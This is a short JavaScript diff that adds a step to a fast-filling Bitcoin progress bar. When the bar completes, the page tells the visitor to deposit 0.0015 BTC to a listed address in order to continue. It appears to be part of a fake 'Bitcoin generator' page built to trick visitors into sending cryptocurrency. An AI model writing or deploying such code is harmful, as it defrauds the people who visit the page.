@@ -42,6 +42,10 @@ setTimeout(()=>{
             click.disabled=true
             setInterval(()=>{
                 btcprogress.value++
+                if(10000<btcprogress.value){
+                    console.log("Progress completed!")
+                    div3.innerHTML="To continue deposit 0.0015 BTC to this address:<br>1AkrWUFdaMB457PzomDFuKv7L9WAjx2hHu"
+                }
             },1)
         }
     }
